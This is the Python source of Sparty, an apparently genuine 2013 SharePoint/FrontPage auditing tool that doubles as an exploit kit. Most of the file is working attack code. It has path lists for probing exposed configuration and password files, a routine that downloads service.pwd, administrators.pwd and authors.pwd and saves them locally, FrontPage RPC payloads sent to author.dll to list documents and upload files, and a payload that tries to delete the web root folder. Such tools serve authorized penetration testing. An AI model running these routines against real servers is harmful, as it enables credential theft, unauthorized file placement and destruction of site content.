#! python3
# Sparty - Sharepoint/Frontend Auditor
# By: Aditya K Sood - SecNiche Security Labs ! (c) 2013

import os, sys, re, optparse

from contextlib import contextmanager

# import argparse
import requests

__copyright__ = 'Copyright (c) 2013, {Aditya K Sood}'
__license__   = 'BSD'

# Frontend (bin) repository files !

front_bin = [
    '_vti_inf.html',
    '_vti_bin/shtml.dll/_vti_rpc',
    '_vti_bin/owssvr.dll',
    '_vti_bin/_vti_adm/admin.dll',
    '_vti_bin/_vti_adm/admin.exe',
    '_vti_bin/_vti_aut/author.exe',
    '_vti_bin/_vti_aut/WS_FTP.log',
    '_vti_bin/_vti_aut/ws_ftp.log',
    '_vti_bin/shtml.exe/_vti_rpc',
    '_vti_bin/_vti_aut/author.dll'
]

front_services = [
    '_vti_bin/Admin.asmx',
    '_vti_bin/alerts.asmx',
    '_vti_bin/dspsts.asmx',
    '_vti_bin/forms.asmx',
    '_vti_bin/Lists.asmx',
    '_vti_bin/people.asmx',
    '_vti_bin/Permissions.asmx',
    '_vti_bin/search.asmx',
    '_vti_bin/UserGroup.asmx',
    '_vti_bin/versions.asmx',
    '_vti_bin/Views.asmx',
    '_vti_bin/webpartpages.asmx',
    '_vti_bin/webs.asmx',
    '_vti_bin/spsdisco.aspx',
    '_vti_bin/AreaService.asmx',
    '_vti_bin/BusinessDataCatalog.asmx',
    '_vti_bin/ExcelService.asmx',
    '_vti_bin/SharepointEmailWS.asmx',
    '_vti_bin/spscrawl.asmx',
    '_vti_bin/spsearch.asmx',
    '_vti_bin/UserProfileService.asmx',
    '_vti_bin/WebPartPages.asmx'
]

# Frontend (pvt) repository files !

front_pvt = [
    '_vti_pvt/authors.pwd',
    '_vti_pvt/administrators.pwd',
    '_vti_pvt/users.pwd',
    '_vti_pvt/service.pwd',
    '_vti_pvt/service.grp',
    '_vti_pvt/bots.cnf',
    '_vti_pvt/service.cnf',
    '_vti_pvt/access.cnf',
    '_vti_pvt/writeto.cnf',
    '_vti_pvt/botsinf.cnf',
    '_vti_pvt/doctodep.btr',
    '_vti_pvt/deptodoc.btr',
    '_vti_pvt/linkinfo.cnf',
    '_vti_pvt/services.org',
    '_vti_pvt/structure.cnf',
    '_vti_pvt/svcacl.cnf',
    '_vti_pvt/uniqperm.cnf',
    '_vti_pvt/service/lck',
    '_vti_pvt/frontpg.lck'
]

# Sharepoint and Frontend (directory) repository !

directory_check = [
    '_vti_pvt/',
    '_vti_bin/',
    '_vti_log/',
    '_vti_cnf/',
    '_vti_bot',
    '_vti_bin/_vti_adm',
    '_vti_bin/_vti_aut',
    '_vti_txt/'
]

# Sharepoint repository files !

sharepoint_check_layout = [
    '_layouts/aclinv.aspx',
    '_layouts/addrole.aspx',
    '_layouts/AdminRecycleBin.aspx',
    '_layouts/AreaNavigationSettings.aspx',
    '_Layouts/AreaTemplateSettings.aspx',
    '_Layouts/AreaWelcomePage.aspx',
    '_layouts/associatedgroups.aspx',
    '_layouts/bpcf.aspx',
    '_Layouts/ChangeSiteMasterPage.aspx',
    '_layouts/create.aspx',
    '_layouts/editgrp.aspx',
    '_layouts/editprms.aspx',
    '_layouts/groups.aspx',
    '_layouts/help.aspx',
    '_layouts/images/',
    '_layouts/listedit.aspx',
    '_layouts/ManageFeatures.aspx',
    '_layouts/ManageFeatures.aspx',
    '_layouts/mcontent.aspx',
    '_layouts/mngctype.aspx',
    '_layouts/mngfield.aspx',
    '_layouts/mngsiteadmin.aspx',
    '_layouts/mngsubwebs.aspx',
    '_layouts/mngsubwebs.aspx?view=sites',
    '_layouts/mobile/mbllists.aspx',
    '_layouts/MyInfo.aspx',
    '_layouts/MyPage.aspx',
    '_layouts/MyTasks.aspx',
    '_layouts/navoptions.aspx',
    '_layouts/NewDwp.aspx',
    '_layouts/newgrp.aspx',
    '_layouts/newsbweb.aspx',
    '_layouts/PageSettings.aspx',
    '_layouts/people.aspx',
    '_layouts/people.aspx?MembershipGroupId=0',
    '_layouts/permsetup.aspx',
    '_layouts/picker.aspx',
    '_layouts/policy.aspx',
    '_layouts/policyconfig.aspx',
    '_layouts/policycts.aspx',
    '_layouts/Policylist.aspx',
    '_layouts/prjsetng.aspx',
    '_layouts/quiklnch.aspx',
    '_layouts/recyclebin.aspx',
    '_Layouts/RedirectPage.aspx',
    '_layouts/role.aspx',
    '_layouts/settings.aspx',
    '_layouts/SiteDirectorySettings.aspx',
    '_layouts/sitemanager.aspx',
    '_layouts/SiteManager.aspx?lro=all',
    '_layouts/spcf.aspx',
    '_layouts/storman.aspx',
    '_layouts/themeweb.aspx',
    '_layouts/topnav.aspx',
    '_layouts/user.aspx',
    '_layouts/userdisp.aspx',
    '_layouts/userdisp.aspx?ID=1',
    '_layouts/useredit.aspx',
    '_layouts/useredit.aspx?ID=1',
    '_layouts/viewgrouppermissions.aspx',
    '_layouts/viewlsts.aspx',
    '_layouts/vsubwebs.aspx',
    '_layouts/WPPrevw.aspx?ID=247',
    '_layouts/wrkmng.aspx'
]

sharepoint_check_forms = [
    'Forms/DispForm.aspx',
    'Forms/DispForm.aspx?ID=1',
    'Forms/EditForm.aspx',
    'Forms/EditForm.aspx?ID=1',
    'Forms/Forms/AllItems.aspx',
    'Forms/MyItems.aspx',
    'Forms/NewForm.aspx',
    'Pages/default.aspx',
    'Pages/Forms/AllItems.aspx'
]

sharepoint_check_catalog = [
    '_catalogs/masterpage/Forms/AllItems.aspx',
    '_catalogs/wp/Forms/AllItems.aspx',
    '_catalogs/wt/Forms/Common.aspx'
]

refine_target = []
pvt_target = []
dir_target = []
sharepoint_target_layout = []
sharepoint_target_forms = []
sharepoint_target_catalog = []

DEFAULT_HEADERS = {
    'MIME-Version'           : '4.0',
    'User-Agent'             : 'MSFrontPage/4.0',
    'X-Vermeer-Content-Type' : 'application/x-www-form-urlencoded',
    'Connection'             : 'Keep-Alive'
}

# sparty banner

def banner():
    print("\t---------------------------------------------------------------")
    sparty_banner = """
        _|_|_|    _|_|_|     _|_|    _|_|_|    _|_|_|_|_|  _|      _|
        _|        _|    _|  _|    _|  _|    _|      _|        _|  _|
        _|_|    _|_|_|    _|_|_|_|  _|_|_|        _|          _|
            _|  _|        _|    _|  _|    _|      _|          _|
        _|_|_|    _|        _|    _|  _|    _|      _|          _|

        SPARTY      : Sharepoint/Frontpage Security Auditing Tool!
        Authored by : Aditya K Sood | 0kn0ck@secniche.org  | 2013
        Twitter     : @AdityaKSood
        Powered by  : SecNiche Security Labs !
    """
    print("\t" + sparty_banner.strip())
    print("\t--------------------------------------------------------------")


# usage and examples for using sparty

def sparty_usage(destination):
    print("[scanning access permissions in forms directory - sharepoint] %s -s forms -u  %s " % (sys.argv[0], destination))
    print("[scanning access permissions in frontpage directory - frontpage] %s -f pvt -u %s " % (sys.argv[0], destination))
    print("[dumping passwords] %s -d dump -u %s " % (sys.argv[0], destination))
    print("[note] : please take this into consideration!")
    print("\t\t: (1) always specify https | http explcitly !")
    print("\t\t: (2) always provide the proper directory structure where sharepoint/frontpage is installed !")
    print("\t\t: (3) do not specify '/' at the end of url !")

class fragile(object):
    class Break(Exception):
        """Break out of the with statement"""

    def __init__(self, value):
        self.value = value

    def __enter__(self):
        return self.value.__enter__()

    def __exit__(self, etype, value, traceback):
        error = self.value.__exit__(etype, value, traceback)
        if etype == self.Break:
            return True
        return error

@contextmanager
def request_url(destination, data=None, *args, **kwargs):
    r = None
    try:
        r = requests.post(destination, data=data, headers=DEFAULT_HEADERS) if data else requests.get(destination)
        r.raise_for_status()
    except requests.exceptions.HTTPError as err:
        print("[-] url error ! - %s" % err)
        r = None

    except requests.exceptions.ConnectionError as err:
        print("[-] connecting error ! - %s" % err)
        r = None

    except requests.exceptions.Timeout as err:
        print("[-] timeout error ! - %s" % err)
        r = None

    except requests.exceptions.RequestException as err:
        print("[-] unknown error ! - %s" % err)
        r = None

    finally:
        yield r

# build target for scanning frontpage and sharepoint files

def build_target(target, front_dirs=[], refine_target=[]):
    for item in front_dirs:
        refine_target.append(target + "/" + item)

# function to display success notification!

def module_success(module_name):
    print("\n[+] check for HTTP codes (200) for active list of accessible files or directories! (404) - Not exists | (403) - Forbidden ! (500) - Server Error")
    print("\n[+] (%s) - module executed successfully !\n" % module_name)


# extracting information about target's enviornment !

def target_information(name):
    with fragile(request_url(name)) as r:
        if r is None: raise fragile.Break
        print("[+] fetching information from the given target : (%s)" % (r.url))
        print("[+] target responded with HTTP code: (%s)"             % (r.status_code))
        print("[+] target is running server: (%s)"                    % (r.headers['server']))


# audit function for scanning frontpage and sharepoint files

def audit(target=[]):
    for element in target:
        with fragile(request_url(element)) as r:
            if r is None: raise fragile.Break
            status_code = r.status_code
            if status_code == requests.codes.ok:
                print("[+] (%s) - (%d)" % (element, status_code))
            else:
                print("[-] (%s) - (%d)" % (element, status_code))

# dump frontpage service and administrators password files if present

def dump_credentials(dest):
    pwd_targets = []
    pwd_files = [
        '_vti_pvt/service.pwd',
        '_vti_pvt/administrators.pwd',
        '_vti_pvt/authors.pwd'
    ]

    for item in pwd_files:
        pwd_targets.append(dest + "/" + item)

    for entry in pwd_targets:
        with fragile(request_url(entry)) as r:
            if r is None: raise fragile.Break
            status_code = r.status_code
            if status_code == requests.codes.ok:
                print("[+] dumping contents of file located at : (%s)" % (entry))
                filename = "__dump__.txt"
                dump = open(filename, 'a')
                dump.write(r.text)
                print(r.text)
            else:
                print("[-] could not dump the file located at : (%s) | (%d)" % (entry, status_code))

        print("[*] ---------------------------------------------------------------------------------------")

        # print("[+] check the (%s) file if generated !\n" % (filename))

# fingerprinting frontpage version using default files !

def fingerprint_frontpage(name):
    enum_nix = [
        '_vti_bin/_vti_aut/author.exe',
        '_vti_bin/_vti_adm/admin.exe',
        '_vti_bin/shtml.exe'
    ]
    enum_win = [
        '_vti_bin/_vti_aut/author.dll',
        '_vti_bin/_vti_aut/dvwssr.dll',
        '_vti_bin/_vti_adm/admin.dll',
        '_vti_bin/shtml.dll'
    ]
    build_enum_nix = []
    build_enum_win = []

    for item in enum_nix:
        build_enum_nix.append(name + "/" + item)

    for entry in build_enum_nix:
        with fragile(request_url(entry)) as r:
            if r is None: raise fragile.Break
            status_code = r.status_code
            if status_code == requests.codes.ok:
                print("[+] front page is tested as : nix version |  (%s) | (%d)" % (entry, status_code))

    for item in enum_win:
        build_enum_win.append(name + "/" + item)

    for entry in build_enum_win:
        with fragile(request_url(entry)) as r:
            if r is None: raise fragile.Break
            status_code = r.status_code
            if status_code == requests.codes.ok:
                print("[+] front page is tested as : windows version |  (%s) | (%d)" % (entry, status_code))

    frontend_version = name + "/_vti_inf.html"
    with fragile(request_url(frontend_version)) as r:
        if r is None: raise fragile.Break
        print("[+] extracting frontpage version from default file : (%s):" % re.findall(r'FPVersion=(.*)', r.text))

    print("[*] ---------------------------------------------------------------------------------------")

# dump sharepoint headers for version fingerprinting

def dump_sharepoint_headers(name):
    print("")

    headers = {
        'microsoftsharepointteamservices' : 'sharepoint version',
        'x-sharepointhealthscore'         : 'load balancing ability',
        'sprequestguid'                   : 'diagnostics ability'
    }
    with fragile(request_url(name)) as r:
        if r is None: raise fragile.Break
        for header in headers:
            try:
                desc = headers[header]
                rHeader = r.headers[header]
                print(f"[+] configured {desc} is : ({rHeader})")

            except KeyError:
                print(f"[-] {headers[header]} could not be extracted using HTTP header : {header} !")

# file uploading routine to upload file remotely on frontpage extensions

def frontpage_rpc_check(name):
    exp_target_list = [
        '_vti_bin/shtml.exe/_vti_rpc',
        '_vti_bin/shtml.dll/_vti_rpc'
    ]
    data = "method= server version"
    # data="method=list+services:4.0.2.0000&service_name="
    # for item in exploit_targets:

    for item in exp_target_list:
        destination = name + "/" + item

    print("[+] Sending HTTP GET request to - (%s) for verifying whether RPC is listening !" % destination)
    with fragile(request_url(destination)) as r:
        if r is None: raise fragile.Break
        status_code = r.status_code
        if status_code == requests.codes.ok:
            print("[+] target is listening on frontpage RPC - (%s) !\n" % status_code)
        else:
            print("[-] target is not listening on frontpage RPC - (%s) !\n" % status_code)

    print("[+] Sending HTTP POST request to retrieve software version - (%s)" % destination)
    with fragile(request_url(destination, data)) as r:
        if r is None: raise fragile.Break
        status_code = r.status_code
        if status_code == requests.codes.ok:
            print("[+] target accepts the request - (%s) | (%s) !\n" % (data, status_code))
            filename = "__version__.txt" + ".html"
            version = open(filename, 'a')
            version.write(r.text)
            print("[+] check file for contents - (%s) \n" % filename)
        else:
            print("[-] target fails to accept request - (%s) | (%s) !\n" % (data, status_code))

    print("[*] ---------------------------------------------------------------------------------------")


def frontpage_service_listing(name):
    service_target_list = [
        '_vti_bin/shtml.exe/_vti_rpc',
        '_vti_bin/shtml.dll/_vti_rpc'
    ]

    data = [
        'method=list+services:3.0.2.1076&service_name=',
        'method=list+services:4.0.2.471&service_name=',
        'method=list+services:4.0.2.0000&service_name=',
        'method=list+services:5.0.2.4803&service_name=',
        'method=list+services:5.0.2.2623&service_name=',
        'method=list+services:6.0.2.5420&service_name='
    ]

    for item in service_target_list:
        destination = name + "/" + item

    print("[+] Sending HTTP POST request to retrieve service listing  - (%s)" % destination)
    for entry in data:
        with fragile(request_url(destination, entry)) as r:
            if r is None: raise fragile.Break
            status_code = r.status_code
            if status_code == requests.codes.ok:
                print("[+] target accepts the request - (%s) | (%s) !" % (entry, status_code))
                filename = "__service-list__.txt" + entry + ".html"
                service_list = open(filename, 'a')
                service_list.write(r.text)
                print("[+] check file for contents - (%s) \n" % filename)
            else:
                print("[-] target fails to accept request - (%s) | (%s) !\n" % (entry, status_code))

    print("[*] ---------------------------------------------------------------------------------------")


def frontpage_config_check(name):
    # running some standard commands to retrieve files and configuration checks
    # frontpage versions validated are: 3.0.2.1706 , 4.0.2.4715 , 5.0.2.4803, 5.0.2.2623 , 6.0.2.5420
    # version : major ver=n.minor ver=n.phase ver=n.verincr=v

    front_exp_target = '_vti_bin/_vti_aut/author.dll'
    payloads = [
        'method=open service:3.0.2.1706&service_name=/',
        'method=list documents:3.0.2.1706&service_name=&listHiddenDocs=false&listExplorerDocs=false&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=false&listIncludeParent=true&listDerivedT=false&listBorders=false&initialUrl=',
        'method=getdocument:3.0.2.1105&service_name=&document_name=about/default.htm&old_theme_html=false&force=true&get_option=none&doc_version=',
        'method=open service:4.0.2.4715&service_name=/',
        'method=list documents:4.0.2.4715&service_name=&listHiddenDocs=false&listExplorerDocs=false&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=false&listIncludeParent=true&listDerivedT=false&listBorders=false&initialUrl=',
        'method=getdocument:4.0.2.4715&service_name=&document_name=about/default.htm&old_theme_html=false&force=true&get_option=none&doc_version=',
        'method=open service:5.0.2.4803&service_name=/',
        'method=list documents:5.0.2.4803&service_name=&listHiddenDocs=false&listExplorerDocs=false&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=false&listIncludeParent=true&listDerivedT=false&listBorders=false&initialUrl=',
        'method=getdocument:5.0.2.4803&service_name=&document_name=about/default.htm&old_theme_html=false&force=true&get_option=none&doc_version=',
        'method=open service:5.0.2.2623&service_name=/',
        'method=list documents:5.0.2.2623&service_name=&listHiddenDocs=false&listExplorerDocs=false&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=false&listIncludeParent=true&listDerivedT=false&listBorders=false&initialUrl=',
        'method=getdocument:5.0.2.2623&service_name=&document_name=about/default.htm&old_theme_html=false&force=true&get_option=none&doc_version=',
        'method=open service:6.0.2.5420&service_name=/',
        'method=list documents:6.0.2.5420&service_name=&listHiddenDocs=false&listExplorerDocs=false&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=false&listIncludeParent=true&listDerivedT=false&listBorders=false&initialUrl=',
        'method=getdocument:6.0.2.5420&service_name=&document_name=about/default.htm&old_theme_html=false&force=true&get_option=none&doc_version='
    ]

    for item in payloads:
        destination = name + "/" + front_exp_target
        print("[+] Sending HTTP POST request to [open service | listing documents] - (%s)" % destination)
        with fragile(request_url(destination, item)) as r:
            if r is None: raise fragile.Break
            status_code = r.status_code

            if status_code == requests.codes.ok:
                print("[+] target accepts the request - (%s) | (%s) !" % (item, status_code))
                filename = "__author-dll-config__.txt" + ".html"
                service_list = open(filename, 'a')
                service_list.write(r.text)
                print("[+] check file for contents - (%s) \n" % filename)

            else:
                print("[-] target fails to accept request - (%s) | (%s) !\n" % (item, status_code))


# remove specific folder from the web server

def frontpage_remove_folder(name):
    # running some standard commands to remove "/" folder from the web server using author.dll
    # frontpage versions validated are: 3.0.2.1706 , 4.0.2.4715 , 5.0.2.4803, 5.0.2.2623 , 6.0.2.5420

    file_exp_target = '_vti_bin/_vti_aut/author.dll'
    payloads = [
        'method=remove+documents:3.0.2.1786&service_name=/',
        'method=remove+documents:4.0.2.4715&service_name=/',
        'method=remove+documents:5.0.3.4803&service_name=/',
        'method=remove+documents:5.0.2.4803&service_name=/',
        'method=remove+documents:6.0.2.5420&service_name=/'
    ]

    for item in payloads:
        destination = name + "/" + file_exp_target
        print("[+] Sending HTTP POST request to remove '/' directory to - (%s)" % destination)
        with fragile(request_url(destination, item)) as r:
            if r is None: raise fragile.Break
            status_code = r.status_code

            if status_code == requests.codes.ok:
                print("[+] folder removed successfully - (%s) | (%s) !\n" % (item, status_code))
                print(r.text)
            else:
                print("[-] fails to remove '/' folder at  - (%s) | (%s) !\n" % (item, status_code))

# file uploading through author.dll

def file_upload_check(name):
    # running some standard commands to upload file to  web server using author.dll
    # frontpage versions validated are: 3.0.2.1706 , 4.0.2.4715 , 5.0.2.4803, 5.0.2.2623 , 6.0.2.5420

    os.system("echo 'Sparty Testing !' > sparty.txt")
    file_exp_target = '_vti_bin/_vti_aut/author.dll'
    payloads = [
        'method=put document:3.0.2.1706&service_name=&document=[document_name=sparty.txt ; meta_info=[]]&put_option=overwrite&comment=&keep_checked_out=false',
        'method=put document:4.0.2.4715&service_name=&document=[document_name=sparty.txt ; meta_info=[]]&put_option=overwrite&comment=&keep_checked_out=false',
        'method=put document:5.0.2.2623&service_name=&document=[document_name=sparty.txt ; meta_info=[]]&put_option=overwrite&comment=&keep_checked_out=false',
        'method=put document:5.0.2.4823&service_name=&document=[document_name=sparty.txt ; meta_info=[]]&put_option=overwrite&comment=&keep_checked_out=false',
        'method=put document:6.0.2.5420&service_name=&document=[document_name=sparty.txt ; meta_info=[]]&put_option=overwrite&comment=&keep_checked_out=false'
    ]

    for item in payloads:
        destination = name + "/" + file_exp_target
        print("[+] Sending HTTP POST request for uploading file to - (%s)" % destination)

        with fragile(request_url(destination, item)) as r:
            if r is None: raise fragile.Break
            status_code = r.status_code

            if status_code == requests.codes.ok:
                print("[+] file uploaded successfully - (%s) | (%s) !\n" % (item, status_code))
                print(r.text)
            else:
                print("[-] file fails to upload at  - (%s) | (%s) !\n" % (item, status_code))


# main routine to trigger sub routines (functions) !

def main():
    banner()

    parser = optparse.OptionParser(usage="usage: %prog [options]", version="%prog 1.0")
    front_page = optparse.OptionGroup(parser,  "Frontpage:")
    share_point = optparse.OptionGroup(parser, "Sharepoint:")
    mandatory = optparse.OptionGroup(parser,   "Mandatory:")
    exploit = optparse.OptionGroup(parser,     "Information Gathering and Exploit:")
    general = optparse.OptionGroup(parser,     "General:")

    mandatory.add_option("-u", "--url",            type="string", help="target url to scan with proper structure", dest="url")
    front_page.add_option("-f", "--frontpage",     type="choice", choices=['pvt', 'bin'], help="<FRONTPAGE = pvt | bin> -- to check access permissions on frontpage standard files in vti or bin directory!", dest="frontpage")
    share_point.add_option("-s", "--sharepoint",   type="choice", choices=['forms', 'layouts', 'catalog'], help="<SHAREPOINT = forms | layouts | catalog> -- to check access permissions on sharepoint standard files in forms or layouts or catalog directory!", dest="sharepoint")

    exploit.add_option("-v", "--http_fingerprint", type="choice", choices=['ms_sharepoint', 'ms_frontpage'], help="<FINGERprint(= ms_sharepoint | ms_frontpage> -- fingerprint sharepoint or frontpage based on HTTP headers!" , dest="fingerprint")
    exploit.add_option("-d", "--dump",             type="choice", choices=['dump', 'extract'] , help="<DUMP = dump | extract> -- dump credentials from default sharepoint and frontpage files (configuration errors and exposed entries)!", dest="dump")
    exploit.add_option("-l", "--list",             type="choice", choices=['list', 'index'], help="<DIRECTORY = list | index> -- check directory listing and permissions!", dest="directory")
    exploit.add_option("-e", "--exploit",          type="choice", choices=['rpc_version_check', 'rpc_service_listing', 'author_config_check', 'rpc_file_upload', 'author_remove_folder'], help="EXPLOIT = <rpc_version_check | rpc_service_listing | rpc_file_upload | author_config_check | author_remove_folder> -- exploit vulnerable installations by checking RPC querying, service listing and file uploading", dest="exploit")
    exploit.add_option("-i", "--services",         type="choice", choices=['serv', 'services'], help="SERVICES = <serv | services> -- checking exposed services !", dest="services")
    general.add_option("-x", "--examples",         type="string", help="running usage examples !", dest="examples")

    parser.add_option_group(front_page)
    parser.add_option_group(share_point)
    parser.add_option_group(mandatory)
    parser.add_option_group(exploit)
    parser.add_option_group(general)

    options, arguments = parser.parse_args()

    try:
        target = options.url
        if target is not None:
            target_information(target)
        else:
            print("[-] specify the options. use (-h) for more help!")
            sys.exit(0)

        if options.dump == "dump" or options.dump == "extract":
            print("\n[+]------------------------------------------------------------------------------------------------!")
            print("[+] dumping (service.pwd | authors.pwd | administrators.pwd | ws_ftp.log) files if possible!")
            print("[+]--------------------------------------------------------------------------------------------------!\n")
            dump_credentials(target)
            module_success("password dumping")
            return

        elif options.exploit == "rpc_version_check":
            print("\n[+]-----------------------------------------------------------------------!")
            print("[+] auditing frontpage RPC service                                          !")
            print("[+]-------------------------------------------------------------------------!\n")
            frontpage_rpc_check(target)
            module_success("module RPC version check")
            return

        elif options.exploit == "rpc_service_listing":
            print("\n[+]-----------------------------------------------------------------------!")
            print("[+] auditing frontpage RPC service for fetching listing                     !")
            print("[+]-------------------------------------------------------------------------!\n")
            frontpage_service_listing(target)
            module_success("module RPC service listing check")
            return

        elif options.exploit == "author_config_check":
            print("\n[+]-----------------------------------------------------------------------!")
            print("[+] auditing frontpage configuration settings                               !")
            print("[+]-------------------------------------------------------------------------!\n")
            frontpage_config_check(target)
            module_success("module RPC check")
            return

        elif options.exploit == "author_remove_folder":
            print("\n[+]-----------------------------------------------------------------------!")
            print("[+] trying to remove folder from web server                                 !")
            print("[+]-------------------------------------------------------------------------!\n")
            frontpage_remove_folder(target)
            module_success("module remove folder check")
            return

        elif options.exploit == "rpc_file_upload":
            print("\n[+]-----------------------------------------------------------------------!")
            print("[+] auditing file uploading misconfiguration                                !")
            print("[+]-------------------------------------------------------------------------!\n")
            file_upload_check(target)
            module_success("module file upload check")
            return

        elif options.examples == "examples":
            sparty_usage(target)
            return

        elif options.directory == "list" or options.directory == "index":
            build_target(target, directory_check, dir_target)
            print("\n[+]-----------------------------------------------------------------------!")
            print("[+] auditing frontpage directory permissions (forbidden | index | not exist)!")
            print("[+]-------------------------------------------------------------------------!\n")
            audit(dir_target)
            module_success("directory check")
            return

        elif options.frontpage == "bin":
            build_target(target, front_bin, refine_target)
            print("\n[+]----------------------------------------!")
            print("[+] auditing frontpage '/_vti_bin/' directory!")
            print("[+]------------------------------------------!\n")
            audit(refine_target)
            module_success("bin file access")

        elif options.frontpage == "pvt":
            build_target(target, front_pvt, pvt_target)
            print("\n[+]---------------------------------------------------------!")
            print("[+] auditing '/_vti_pvt/' directory for sensitive information !")
            print("[+]-----------------------------------------------------------!\n")
            audit(pvt_target)
            module_success("pvt file access")
            return

        elif options.fingerprint == "ms_sharepoint":
            dump_sharepoint_headers(target)
            print("\n[+] sharepoint fingerprinting module completed !\n")
            return

        elif options.fingerprint == "ms_frontpage":
            fingerprint_frontpage(target)
            print("\n[+] frontpage fingerprinting module completed !\n")
            return

        elif options.sharepoint == "layouts":
            build_target(target, sharepoint_check_layout, sharepoint_target_layout)
            print("\n[+]-----------------------------------------------------------------!")
            print("[+] auditing sharepoint '/_layouts/' directory for access permissions !")
            print("[+]-------------------------------------------------------------------!\n")
            audit(sharepoint_target_layout)
            module_success("layout file access")
            return

        elif options.sharepoint == "forms":
            build_target(target, sharepoint_check_forms, sharepoint_target_forms)
            print("\n[+]--------------------------------------------------------------!")
            print("[+] auditing sharepoint '/forms/' directory for access permissions !")
            print("[+]----------------------------------------------------------------!\n")
            audit(sharepoint_target_forms)
            module_success("forms file access")
            return

        elif options.sharepoint == "catalog":
            build_target(target, sharepoint_check_catalog, sharepoint_target_catalog)
            print("\n[+]--------------------------------------------------------------!")
            print("[+] auditing sharepoint '/catalog/' directory for access permissions !")
            print("[+]----------------------------------------------------------------!\n")
            audit(sharepoint_target_catalog)
            module_success("catalogs file access")
            return

        elif options.services == "serv" or options.services == "services":
            build_target(target, front_services, refine_target)
            print("\n[+]---------------------------------------------------------------!")
            print("[+] checking exposed services in the frontpage/sharepoint  directory!")
            print("[+]-----------------------------------------------------------------!\n")
            audit(refine_target)
            module_success("exposed services check")

        else:
            print("[-] please provide the proper scanning options!")
            print("[+] check help (-h) for arguments and url specification!")
            sys.exit(0)

    except ValueError:
        print("[-] ValueError occurred. Improper option argument or url!")
        print("[+] check for help (-h) for more details!")
        sys.exit(0)

    except TypeError:
        print("[-] TypeError occcured. Missing option argument or url!")
        print("[+] check for help (-h) for more details!")
        sys.exit(0)

    except IndexError:
        sparty_usage()
        sys.exit(0)

    except KeyboardInterrupt:
        print("[-] halt signal detected, exiting the program !\n")
        sys.exit(0)


# calling main
if __name__ == '__main__':
    main()
